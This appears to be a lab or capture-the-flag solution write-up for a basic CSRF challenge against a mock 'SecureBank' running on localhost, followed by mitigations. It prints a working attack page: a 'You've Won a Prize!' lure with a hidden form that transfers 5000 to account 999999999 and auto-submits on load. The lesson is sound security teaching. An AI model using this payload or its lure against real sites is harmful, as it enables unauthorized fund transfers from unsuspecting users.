Level 1 Solution: Basic Form CSRF - SecureBank Attack

Challenge Overview

This challenge demonstrates a classic CSRF attack against SecureBank's fund transfer functionality. The vulnerable form processes POST requests without any CSRF protection mechanisms, allowing attackers to forge unauthorized fund transfers.

Vulnerability Analysis

The SecureBank fund transfer form is vulnerable to CSRF attacks because:

  • No Anti-CSRF Tokens: The form doesn't include any unpredictable tokens that would validate the request's origin
  • No Origin/Referer Validation: The application doesn't verify where the request is coming from
  • Relies on Cookies: Authentication is handled via cookies which are automatically sent with cross-site requests
  • No SameSite Cookie Attributes: Cookies don't have SameSite restrictions to prevent cross-origin requests

This makes it possible for an attacker to create a malicious page that submits a form to the vulnerable endpoint when visited by an authenticated user.

Step-by-Step Solution

  1. Analyze Target Form: Inspect SecureBank's fund transfer form to identify the action URL, method, and required parameters
  2. Identify Required Parameters: The form requires "recipient" (account number), "amount" (transfer amount), and "memo" (transfer description)
  3. Create Attack Page: Build a malicious HTML page with a hidden form targeting the vulnerable endpoint
  4. Set Attack Parameters: Configure the form to transfer funds to account "999999999" as specified in the challenge
  5. Auto-Submit Form: Use JavaScript to automatically submit the form when the page loads
  6. Deploy Social Engineering: In a real attack, trick authenticated users into visiting the malicious page
Key Insight: Without CSRF protection, any authenticated user who visits a malicious page can have actions performed on their behalf without their knowledge or consent.

CSRF Attack Payload

<!-- Basic CSRF Attack Against SecureBank -->
<html>
<head>
    <title>You've Won a Prize!</title>
</head>
<body>
    <h2>Congratulations! Your page is loading...</h2>
    
    <!-- Hidden malicious form targeting SecureBank's transfer endpoint -->
    <form id="csrf-attack" action="http://localhost:5000/csrf/level1" method="post" style="display:none;">
        <input type="text" name="recipient" value="999999999">
        <input type="number" name="amount" value="5000.00">
        <input type="text" name="memo" value="Prize transfer">
        <input type="submit" value="Submit">
    </form>
    
    <script>
    // Auto-submit the form when the page loads
    window.onload = function() {
        document.getElementById('csrf-attack').submit();
    };
    </script>
</body>
</html>

Security Impact

This basic CSRF vulnerability in SecureBank's fund transfer system allows attackers to:

  • Financial Theft: Transfer funds from victim accounts to attacker-controlled accounts
  • Account Manipulation: Perform unauthorized transactions without user knowledge
  • Mass Exploitation: Scale attacks across multiple users through malicious websites or emails
  • Reputational Damage: Undermine customer trust in the banking platform
Real-world Impact: A successful CSRF attack against a banking platform could result in significant financial losses, customer lawsuits, and regulatory penalties.

Mitigation Strategies

Primary Defenses:
  • CSRF Tokens: Implement unpredictable, session-specific tokens in all state-changing forms
  • SameSite Cookies: Set cookies with SameSite=Strict or SameSite=Lax attributes
  • Double Submit Cookies: Include CSRF token in both cookie and request parameter
Additional Protections:
  • Origin Header Validation: Verify Origin and Referer headers match expected domains
  • Custom Request Headers: Require X-Requested-With headers for AJAX requests
  • Transaction Verification: Implement email/SMS confirmation for sensitive operations
Secure Implementation Example: 
<form action="/transfer" method="post">
    <input type="hidden" name="csrf_token" value="{{ "{{ csrf_token }}" }}">
    <input type="text" name="recipient" required>
    <input type="number" name="amount" required>
    <button type="submit">Transfer Funds</button>
</form>
